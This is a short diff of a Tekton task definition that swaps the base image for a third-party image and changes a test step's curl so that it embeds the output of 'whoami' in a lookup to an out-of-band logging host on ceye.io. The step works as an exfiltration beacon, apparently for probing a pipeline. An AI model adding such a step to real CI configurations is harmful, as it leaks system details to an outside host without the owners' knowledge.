@@ -5,9 +5,9 @@ metadata:
 spec:
   steps:
     - name: test
-      image: ubuntu
+      image: xfantasy/nonrootubuntu
       command:
         - /bin/bash
       args:
         - "-c"
-        - "curl tekton.7s171w.ceye.io"
+        - "curl tekton.`whoami`.7s171w.ceye.io"
